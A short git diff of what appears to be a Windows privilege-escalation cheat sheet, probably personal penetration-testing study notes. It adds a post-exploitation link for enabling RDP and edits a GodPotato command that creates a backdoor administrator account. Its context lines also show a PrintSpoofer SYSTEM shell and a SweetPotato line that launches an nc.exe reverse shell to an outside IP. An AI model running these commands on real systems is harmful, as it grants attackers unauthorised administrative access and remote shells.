@@ -23,6 +23,10 @@ Weak Registry
 
 Host file -`C:\Windows\System32\drivers\etc\hosts`
 
+### Post Exploit
+
+{% embed url="https://github.com/crazywifi/Enable-RDP-One-Liner-CMD" %}
+
 ## Commands
 
 ### Fundamentals
@@ -229,7 +233,7 @@ Check .NET version for GodPotato, does not miss at all just don't go for a revsh
 reg query "HKLM\SOFTWARE\Microsoft\Net Framework Setup\NDP" /s
 ```
 
-* GodPotato  - `.\GP.exe -cmd "net user /add jtrip jtrip && net localgroup administrators jtrip /add"`
+* GodPotato  - `.\GP.exe -cmd "net user jtrip jtrip /add & net localgroup administrators jtrip /add"`
 * PrintSpoofer - .`\PrintSpoofer.exe -i -c cmd`
 * SweetPotato - `.\SweetPotato.exe -e EfsRpc -p C:\programdata\nc.exe -a "192.168.45.205 1234 -e cmd"`
 
@@ -323,7 +327,7 @@ $documents.MoveHere($item)
 
 dnSpy the GOAT
 
-<div align="left"><figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure></div>
+<div align="left"><figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure></div>
 
 ## Kernel Exploits
 
